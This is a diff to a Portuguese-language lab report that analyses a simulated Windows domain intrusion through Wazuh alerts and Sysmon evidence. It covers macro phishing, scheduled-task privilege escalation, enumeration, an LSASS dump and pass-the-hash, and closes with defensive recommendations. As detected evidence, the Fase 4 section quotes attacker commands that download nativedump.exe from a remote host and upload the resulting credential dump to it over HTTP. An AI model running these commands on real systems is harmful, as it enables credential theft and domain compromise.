@@ -865,7 +865,7 @@ O atacante agora detém controlo completo sobre o domínio:
 <br/>
 <br/>
 
-##  Fase 1 — Deteção de Acesso Inicial via Macro Maliciosa (Phishing)
+##  🧩 Fase 1 — Deteção de Acesso Inicial via Macro Maliciosa (Phishing)
 <br/>
 <br/>
 
@@ -1014,7 +1014,7 @@ A Wazuh demonstrou capacidades eficazes na deteção de comportamentos **fileles
 - Usar AMSI (Antimalware Scan Interface) para bloquear scripts ofuscados ou suspeitos em tempo real.
 - Usar EDR para bloquear execuções suspeitas com base em heurística e MITRE ATT&CK TTPs.
 - Usar alerta de correlação para deteção multi-evento (chain-based).
-- Realizar campanhas regulares de simulação de phishing e Treinar colaboradores para não ativar conteúdo (ex: macros) de fontes desconhecidas
+- **Realizar campanhas regulares de simulação de phishing e sensibilização cibernética treinando colaboradores.**
 
 ---
 
@@ -1033,7 +1033,7 @@ Estes dados permitiriam uma **ação de resposta imediata e eficaz** por parte d
 <br/>
 <br/>
 
-##  Fase 2 — Escalada de Privilégios
+## 🧩 Fase 2 — Escalada de Privilégios
 
 <br/>
 <br/>
@@ -1227,6 +1227,15 @@ O próximo conjunto de alertas revela um comportamento ofensivo associado à **e
 
 <br/>
 <br/>
+E, por fim, a confirmação da escalada de privilégio foi feita com sucesso, tendo sido detectada através do evento mostrado na imagem seguinte. É possível verificar uma ligação feita pelo PowerShell, numa porta suspeita, em que o utilizador em questão é o SYSTEM, revelando o comprometimento total da máquina cliente. 
+<p align="center">
+<br/>
+  <br/>
+  <img src="https://github.com/user-attachments/assets/d824a9a5-eb29-4d30-bcb2-b11de2ddfeeb" height="80%" width="80%"/>
+    <br/>
+    <br/>
+  <p/>
+
 
 **Conclusão:**
 Estes eventos representam uma tentativa clara de **elevação de privilégios por substituição de scripts agendados**.  
@@ -1248,7 +1257,7 @@ O atacante validou permissões com `icacls` e, ao confirmar fragilidades, usou `
 - **Exfiltração de dados com `Invoke-RestMethod`**, enviando ficheiros `.txt` com resultados da enumeração para o servidor remoto.
 - **Substituição de script legítimo (`svc_launcher.ps1`) por versão maliciosa**, com permissões permissivas na pasta `C:\TempTask\`.
 - **Técnica de Escalada de Privilégios via tarefa agendada**, visando execução com permissões SYSTEM.
-
+- **Ligação via powershell pelo user SYSTEM**
 <br/>
 <br/>
     
@@ -1261,8 +1270,484 @@ O atacante validou permissões com `icacls` e, ao confirmar fragilidades, usou `
 - **Aplicar permissões rigorosas em diretórios sensíveis**, impedindo escrita por utilizadores sem privilégios elevados.
 - **Auditar e validar tarefas agendadas** que executam scripts PowerShell no arranque.
 - **Implementar AppLocker ou WDAC** para limitar a execução de scripts não assinados e ferramentas de pós-exploração
+- **Impedir que estações de trabalho comuniquem diretamente em portas incomuns como 4444, etc.**
+---
+
+<br/>
+<br/>
+
+## 🧩 Fase 3 – Enumeração do Domínio
+<br/>
+<br/>
+
+### 📷 Visão Geral dos Alertas Detectados  
+
+<p align="center">
+<br/>
+  <br/>
+   <img src="https://github.com/user-attachments/assets/d424ce05-b00b-48fc-87b5-9683380f7656" height="80%" width="80%"/>   
+   <br/>
+   <br/>
+ <p/>
+
+
+Durante esta fase, o atacante já com privilégios elevados iniciou uma sequência de **atividades de reconhecimento**, utilizando ferramentas nativas do Windows para realizar a enumeração do domínio. Este comportamento é típico de um adversário em fase de exploração pós-comprometimento, que procura identificar alvos relevantes, contas privilegiadas e possíveis caminhos de movimentação lateral.
+
+<br/>
+<br/>
+
+### Detalhes Relevantes Observados:
+
+- **Uso de WMIC (Windows Management Instrumentation Command-line)**. Esta é frequentemente usada por atacantes para recolher informações detalhadas do sistema e domínio
+- **Execução de comandos PowerShell** que geraram instâncias de linha de comandos (`cmd.exe`) para posterior uso do binário `net.exe`.
+- **Utilização do `net.exe`**: Indicador clássico para enumeração de grupos, utilizadores e partilhas de rede.
+- **Sequência de eventos consistente com Discovery Tactics (MITRE ATT&CK T1087, T1018, T1033)**, sugerindo um mapeamento ativo da infraestrutura.
+
+<br/>
+<br/>
+
+> ⚠️ Estes eventos indicam o início de uma tentativa sistemática de reconhecimento e possível **movimentação lateral futura**.
+
+<br/>
+<br/>
+
+### Atividades de Enumeração Detetadas
+<br/>
+<br/>
+#### 1. Enumeração de Contas de Utilizador via WMIC
+
+<p align="center">
+<br/>
+  <br/>
+   <img src="https://github.com/user-attachments/assets/7164fec1-b147-491c-ac08-c889c21f4d7e" height="80%" width="80%"/>   
+   <br/>
+   <br/>
+ <p/>
+
+
+
+**Foi observada a execução do seguinte comando:**
+
+```powershell
+wmic useraccount get name,sid
+```
+
+Este comando permite ao atacante obter todos os utilizadores locais e respetivos SIDs (Security Identifiers), uma etapa fundamental para mapear contas privilegiadas e utilizadores válidos.  
+O comando foi executado com privilégios de **NT AUTHORITY\SYSTEM**, está ligado ao ficheiro `svc_launcher.ps1`, que foi previamente comprometido durante a fase de elevação de privilégios.
+
+---
+
+#### 2. Enumeração de Grupos de Domínio com “net group”
+
+<p align="center">
+<br/>
+  <br/>
+   <img src="https://github.com/user-attachments/assets/f1a9d632-9751-4d0b-b7d9-ed22e50ff8d6" height="80%" width="80%"/>   
+   <br/>
+   <br/>
+ <p/>
+
+
+**Outro comando executado foi:**
+
+```cmd
+net group "Domain Admins" /domain
+```
+
+Este comando permite identificar os utilizadores pertencentes ao grupo **Domain Admins**, crucial para avaliar alvos com elevados privilégios dentro do ambiente.  
+A execução foi feita através do binário **net.exe**, dentro de um contexto do sistema, com origem no mesmo processo PowerShell anterior.
+
+---
+
+#### 3. Enumeração de Partilhas Remotas com “net use”
+
+<br/>
+<br/>
+
+**Finalmente, foi também registado:**
+
+<p align="center">
+<br/>
+  <br/>
+   <img src="https://github.com/user-attachments/assets/371630f2-72d5-4c2a-a377-6bd735f8655c" height="80%" width="80%"/>   
+   <br/>
+   <br/>
+ <p/>
+
+
+```cmd
+net use \\pilao.pt\C$
+```
+
+Este comando tenta montar a partilha administrativa do volume C: de um sistema remoto.  
+Isto pode indicar a intenção de testar conectividade e acessos entre máquinas, ou até mesmo preparar movimentação lateral para outras hosts da rede.
+
+---
+
+#### **Conclusão**
+Estas ações são típicas de uma fase pós-exploração onde o atacante, já com privilégios elevados (**SYSTEM**), procura ganhar visibilidade sobre o domínio e identificar potenciais alvos para movimentos posteriores, como **lateral movement** ou **escalada de privilégios adicionais**.
+
+### Recomendações
+
+- **Desativar ou restringir o uso** de ferramentas como `net.exe`, `wmic`, `PowerShell` e `cmd.exe` para utilizadores que não necessitem delas.
+- **Impedir que contas comuns acedam a partilhas administrativas** `(C$, ADMIN$)` via firewall ou GPO. Desativar o acesso remoto desnecessário entre estações.
+<br/>
+<br/>
+
+
+## 🧩 Fase 4 – Dump de credenciais e acesso ao DC
+
+<br/>
+<br/>
+
+**Alertas detectados**  
+
+<p align="center">
+<br/>
+  <br/>
+   <img src="https://github.com/user-attachments/assets/12b396cc-7f98-4ca6-a466-1fb662bcec55" height="80%" width="80%"/>   
+   <br/>
+   <br/>
+ <p/>
+
+
+Durante esta fase final da intrusão, o atacante ja com o **controlo total sobre a máquina comprometida**, iniciou ações altamente sensíveis, com o objetivo de comprometer contas privilegiadas através do **LSASS memory dump** e subsequente **exfiltração de credenciais**. Foram observados os seguintes comportamentos:
+
+<br/>
+<br/>
+
+- **Criação e execução do binário `nativedump.exe`** diretamente no diretório `C:\Windows\Temp\`, com objetivo explícito de realizar um *dump* da memória do processo LSASS — técnica comum para extrair credenciais armazenadas.
+- Ação realizada **através do PowerShell**, indicando persistência no uso desta ferramenta.
+- **Atividade de exfiltração através da porta 8080**, repetindo o padrão identificado em fases anteriores, utilizando o servidor remoto `192.168.1.205`, para extrair o ficheiro *dump*.
+
+### 1. Upload e Execução da Ferramenta nativedump
+
+<br/>
+<br/>
+
+#### Evidências:
+
+<p align="center">
+<br/>
+  <br/>
+   <img src="https://github.com/user-attachments/assets/916f0696-1600-4144-94ec-1a49e36be432" height="80%" width="80%"/>
+  <br/>
+   <br/>
+   <img src="https://github.com/user-attachments/assets/81619491-94da-42d7-9fd6-9638a6083286" height="80%" width="80%"/>
+  <br/>
+   <br/>
+   <img src="https://github.com/user-attachments/assets/c0b7c655-9dc5-4b71-89a8-4f9149c4a5ea" height="80%" width="80%"/>
+   <br/>
+   <br/>
+ <p/>
+
+
+
+**As três imagens apresentadas demonstram a execução das seguintes ações:**
+1. Upload da ferramenta `nativedump.exe` a partir do IP remoto `192.168.1.205`.
+2. Escrita do binário em `C:\Windows\Temp\nativedump.exe`.
+3. Execução da ferramenta com o objetivo de gerar um dump de memória (LSASS).
+4. Detecção de um evento indicando um possivel dump LSASS.
 
 ---
 
 <br/>
 <br/>
+
+#### Análise
+Foi realizado **upload e execução da ferramenta `nativedump.exe`** no host `Client1.pilao.pt` sob contexto SYSTEM. A finalidade foi a obtenção de **credenciais via memória do LSASS**, comprometendo a segurança de contas privilegiadas.
+
+---
+
+<br/>
+<br/>
+
+#### Evidências de Infiltração e execução do Payload
+
+<br/>
+<br/>
+
+```powershell
+# Descarregamento da ferramenta
+Invoke-WebRequest -Uri "http://192.168.1.205:8080/nativedump.exe" -OutFile "C:\Windows\Temp\nativedump.exe"
+
+# Execução do binário para gerar dump de LSASS
+C:\Windows\Temp\nativedump.exe -o .\proc_664.dmp
+
+# Evidência adicional via Sysmon
+File created: C:\Windows\Temp\proc_696.dmp by nativedump.exe
+```
+
+**Hashes apresentadas no alerta:**
+
+```
+SHA1: ECFBD5E727B5A4FF528F16D1E9B7B8961706C1C7
+MD5: 4ECC2AD245B5A52169D0D06023958FF8
+SHA256: 863DC80643267CAC0414B40972B4B61C2674E2AC9F25A8B53738E1DAB17109D
+IMPhash: D42D559B5C9F08AEF25C56AABDEFD6BE
+```
+
+#### **Acções que poderiam ser realizadas com estes dados:**
+
+<br/>
+<br/>
+
+**Pesquisar em fontes de Threat Intelligence**:
+- Submeter os hashes **SHA256** e **IMPhash** nas plataformas **VirusTotal, MalwareBazaar, HybridAnalysis, ANY.RUN, Intezer**.
+- Correlacionar com a técnica do **MITRE ATT&CK T1003.001** (Dump de memória do LSASS).
+
+**Ações de Resposta a Incidentes (IR)**:
+- Bloquear o **SHA256** através de assinaturas no **EDR / antivírus / NGFW**.
+- **Quarentena ou eliminar** o ficheiro `nativeDump.exe`.
+- Realizar **scans à memória e ao disco** à procura de ferramentas semelhantes.
+- **Investigar o script pai** `svc_launcher.ps1`.
+
+---
+
+<br/>
+<br/>
+
+#### **Intenção do atacante**
+O atacante visava capturar **credenciais em texto claro ou hashes** diretamente da memória do processo LSASS. Isso sugere:
+- Potencial uso posterior em **movimentações laterais**.
+- Possível exfiltração para IP externo via HTTP (porta 8080).
+- Comprometimento total de contas locais ou de domínio com sessões ativas.
+
+---
+
+<br/>
+<br/>
+
+
+### 2. Exfiltração de ficheiro Dump
+
+#### Evidência: Transmissão do ficheiro de memória dump para servidor remoto
+
+<p align="center">
+<br/>
+  <br/>
+   <img src="https://github.com/user-attachments/assets/64943efe-17f6-4493-b57d-f0b63e0a665d" height="80%" width="80%"/>
+ <br/>
+ <br/>
+ <p/>
+
+
+**Fonte**
+- **Hostname:** Client1.pilao.pt
+- **User:** PILAO\SYSTEM
+- **Agente IP:** 192.168.1.206
+
+<br/>
+<br/>
+
+**Comando Detetado**
+```powershell
+Invoke-RestMethod -Uri "http://192.168.1.205:8080/proc_696.dmp" -Method Put -InFile "C:\Windows\Temp\proc_696.dmp"
+```
+
+<br/>
+<br/>
+
+**Descrição**
+O ficheiro `proc_696.dmp`, gerado a partir da ferramenta `nativedump.exe`, foi transmitido via protocolo HTTP utilizando o `Invoke-RestMethod` com método `PUT`, direcionado para um host remoto (192.168.1.205) na porta 8080. Isto indica **exfiltração de credenciais para análise offline**.
+
+<br/>
+<br/>
+Esta ação sugere a tentativa de análise do conteúdo da memória (incluindo hashes de credenciais) fora do sistema comprometido, representando alto risco de **acesso subsequente a outros sistemas**, inclusive ao **Controlador de Domínio**.
+
+---
+
+
+### 3. Acesso ao Controlador de Domínio
+
+#### Evidências
+
+<p align="center">
+<br/>
+  <br/>
+   <img src="https://github.com/user-attachments/assets/f7488444-d66b-4344-9220-658cdffd3264" height="80%" width="80%"/>
+ <br/>
+ <br/>
+ <p/>
+
+Este ponto documenta o acesso final ao **Controlador de Domínio (DC1)** após as etapas anteriores de execução de dump LSASS e exfiltração de credenciais. A sequência de eventos aponta para um acesso privilegiado, com **credenciais roubadas** ou uso de **pass-the-hash (PtH)**.
+
+Jun 22, 2025 @ 11:41:55
+Agent: DC1
+
+- Acesso a partilhas de rede detectado repetidamente.
+- Logon remoto detectado com o utilizador: Administrator
+- Tipo de autenticação: NTLM
+- Suspeita de ataque do tipo Pass-the-Hash
+- Privilegios elevados foram atribuídos a uma nova sessão.
+
+---
+
+#### 📸 Evidência 1 - Autenticação com NTLM (Pass-the-Hash)
+
+<p align="center">
+<br/>
+  <br/>
+   <img src="https://github.com/user-attachments/assets/defccb74-3179-457c-b5fa-e3d21720c45a" height="80%" width="80%"/>
+  <br/>
+  <br/>
+ <p/>
+
+A primeira evidência indica **um processo de autenticação com recurso ao protocolo NTLM V2**, iniciado a partir do endereço IP `192.168.1.205`. O evento reflete uma tentativa de logon do tipo `3` (rede), ou seja, não-interativo, geralmente associado a acessos remotos (ex: SMB ou RDP).
+
+- **Fonte IP**: `192.168.1.205`
+- **Autenticação**: `NTLM V2`
+- **LogonType**: `3` (Rede)
+- **TargetDomain**: `PILAO`
+- **TargetUser**: `Administrator`
+- **SID**: `S-1-5-21-...`
+
+**Interpretação**: Este tipo de autenticação é comum em movimentos laterais ou fases pós-exploração onde o atacante procura aceder a recursos protegidos após obter hashes de contas com privilégios elevados.
+
+#### 📸 Evidência 2 - Acesso à partilha ADMIN$
+
+<p align="center">
+<br/>
+  <br/>
+   <img src="https://github.com/user-attachments/assets/922122e2-0f89-4fa3-9e4a-53ec3b7970b4" height="80%" width="80%"/>
+  <br/>
+  <br/>
+ <p/>
+
+A segunda evidência revela que, **após a autenticação bem-sucedida**, o atacante acedeu remotamente à partilha administrativa `\\ADMIN$` no host `Marcio.pilao.pt` (identificado como o DC), especificamente ao diretório `C:\Windows`.
+
+- **Diretório**: `\?\C:\Windows`
+- **Partilha Acedida**: `\ADMIN$`
+- **Objeto Acedido**: `File`
+- **Utilizador**: `Administrator`
+- **Host**: `Marcio.pilao.pt`
+- **EventID**: `5140`
+
+**Interpretação**: O acesso à `ADMIN$` é típico de **atividades de administração remota**, sendo frequentemente utilizado por ferramentas de ataque para **entrega de payloads, execução de comandos, ou recolha de dados confidenciais** como parte de um ataque de tipo lateral ou de domínio.
+
+---
+#### Conclusão Técnica
+
+Estas evidências em conjunto apontam para um **comprometimento do domínio via autenticação remota com credenciais privilegiadas**, possivelmente através de **Pass-the-Hash**. A sequência de eventos sugere:
+
+1. Obtenção prévia de hashes de contas administrativas  (na Fase 3 com LSASS dump)
+2. Utilização de NTLM para autenticação remota sem necessidade da senha em claro
+3. Acesso a partilhas administrativas no DC como preparação para execução remota ou exfiltração.
+
+#### 🔎 Resumo dos Indicadores Detetados:
+- **Ferramenta de Cred Dumping**: Upload e execução de `nativedump.exe` no diretório `C:\Windows\Temp\`.
+- **Hashing Evidence**: Dump da memória LSASS contendo hashes e credenciais (T1003.001 – MITRE ATT&CK).
+- **Exfiltração de Dados Sensíveis**: Envio do ficheiro `proc_696.dmp` para o IP `192.168.1.205` via `Invoke-RestMethod`.
+- **Autenticação Suspeita via NTLM**: Logon remoto do utilizador `Administrator` com NTLM V2 (LogonType 3), a partir do mesmo IP.
+- **Acesso à partilha ADMIN$** no DC (`Marcio.pilao.pt`), típico de ações pós-exploração.
+- **Host de Origem**: `Client1.pilao.pt` | **Destino final comprometido**: `DC1.pilao.pt`
+
+---
+
+####  Recomendações Técnicas:
+
+1. **Isolamento Imediato dos Hosts Afetados**:
+   - `Client1.pilao.pt` e `DC1.pilao.pt` devem ser removidos da rede para análise forense.
+
+2. **Revogação e Rotação de Credenciais**:
+   - Redefinir todas as passwords administrativas e de domínio potencialmente expostas.
+   - Invalidar todos os hashes em cache.
+
+3. **Análise Forense da Memória e Disco**:
+   - Examinar artefactos e dumps em busca de malware residente ou ferramentas de pós-exploração.
+
+4. **Desativar NTLM onde possível**:
+   - Implementar Kerberos como padrão e aplicar políticas para bloquear NTLM em sessões remotas.
+
+5. **Monitorização de Fluxos de Rede**:
+   - Detetar transmissões HTTP incomuns (porta 8080) e configurar regras de bloqueio em NGFW.
+
+6. **Auditorias e Revisão de Políticas GPO**:
+   - Rever permissões de tarefas agendadas, acessos ao `C:\Windows\Temp`, e execução remota.
+
+
+---
+
+## Conclusão Final da Análise Pós-Ataque
+
+O exercício de análise realizado permitiu uma reconstrução detalhada de todas as fases da intrusão, desde o acesso inicial até ao comprometimento total do domínio. Através da integração de alertas gerados pelo Wazuh, observações dos canais do Windows Event Log e correlação com a framework MITRE ATT&CK, foi possível identificar técnicas, táticas e procedimentos (TTPs) usados pelo atacante de forma eficaz.
+
+---
+
+###  Principais Conclusões
+
+- A **deteção do vetor inicial** via phishing com macro maliciosa permitiu ativar mecanismos de alerta com base na criação de ficheiros `.LNK`, invocação de PowerShell e atividades de rede suspeitas.
+- A **fase de escalada de privilégios** demonstrou uma exploração eficaz de tarefas agendadas mal configuradas, culminando na substituição de scripts e obtenção de permissões SYSTEM.
+- A **enumeração do domínio** revelou a intenção clara de descobrir utilizadores privilegiados, partilhas e potenciais caminhos para movimentação lateral.
+- A **fase crítica de dump de credenciais LSASS** e exfiltração expôs a infraestrutura a riscos graves de comprometimento de contas administrativas.
+- O **acesso ao controlador de domínio (DC)**, com evidências de autenticação NTLM e acesso à partilha ADMIN$, validou o sucesso do atacante na obtenção de controlo total sobre o ambiente.
+
+---
+
+###  Considerações Finais
+
+Este projeto evidencia a importância de uma arquitetura de deteção em profundidade (`defense-in-depth`) com camadas de visibilidade desde o endpoint até à rede. A capacidade de detetar comportamentos anómalos, mesmo quando executados com ferramentas legítimas como PowerShell, foi essencial para rastrear o movimento do atacante.
+
+A resposta a incidentes deve ser orientada por dados precisos e contextuais, e este exercício reforça a necessidade de:
+
+- Capacitar equipas SOC com **tecnologia de monitorização em tempo real**;
+- Implementar **políticas de endurecimento** (hardening) e **controlo de execução de scripts**;
+- Estabelecer **planos de resposta e contenção** automáticos baseados em deteções comportamentais.
+
+---
+
+###  Relevância do Projeto
+
+A análise demonstrou um cenário realista de ataque, e reforçou competências técnicas essenciais na área de **cibersegurança defensiva e forense**. A adoção de boas práticas a seguir descritas permitirá aumentar substancialmente a resiliência da organização perante ameaças avançadas.
+
+---
+
+### ⚠️ Recomendações para Fortalecer a Postura de Segurança da Empresa
+
+1. **Educação e Sensibilização dos Colaboradores**
+   - Realização periódica de campanhas de sensibilização sobre phishing e engenharia social.
+   - Treinos de reconhecimento de emails maliciosos e documentos suspeitos.
+
+2. **Reforço na Política de Macros do Office**
+   - Bloquear a execução de macros não assinadas.
+   - Permitir apenas macros assinadas por entidades confiáveis, ou bloquear Macros por completo.
+
+3. **Hardening de Endpoints e Servidores**
+   - Desativar funcionalidades não utilizadas, como WMIC e PowerShell em modo interativo.
+   - Aplicar políticas de execução restritivas com AppLocker ou WDAC.
+
+4. **Monitorização Contínua com SIEM, EDR e IPS**
+   - Correlacionar múltiplos eventos de segurança.
+   - Detectar e prevenir o uso anómalo de ferramentas ilegítimas bem como legítimas tais como `net.exe`, `wmic`, `powershell.exe`.
+
+5. **Segmentação e Filtragem de Rede**
+   - Isolar segmentos de rede críticos.
+   - Restringir comunicação em portas incomuns (ex: 8080, 4444).
+
+6. **Políticas de Autenticação Segura**
+   - Implementar MFA em todos os acessos administrativos.
+   - Reduzir ou eliminar uso de NTLM em ambientes modernos, forçando Kerberos.
+
+7. **Gestão de Patches e Atualizações**
+   - Garantir atualização contínua de sistemas operativos, aplicações e drivers.
+   - Automatizar a aplicação de atualizações críticas de segurança.
+
+8. **Auditoria de Tarefas Agendadas e Scripts**
+   - Monitorizar scripts que são executados automaticamente no arranque.
+   - Verificar permissões e assinaturas digitais de ficheiros `.ps1`.
+
+9. **Backups Regulares e Testados**
+   - Manter cópias de segurança offline.
+   - Testar regularmente a restauração para garantir integridade dos dados.
+
+10. **Simulações de Ataques Internos**
+    - Realizar exercícios de Red Team/Blue Team para testar resiliência do SOC.
+    - Validar deteções, tempos de resposta e procedimentos de contenção.
+
+---
+
+Estas recomendações, quando aplicadas em conjunto com uma abordagem proativa de cibersegurança, permitirão aumentar significativamente a capacidade de prevenção, deteção e resposta a incidentes.
+
+
+
+
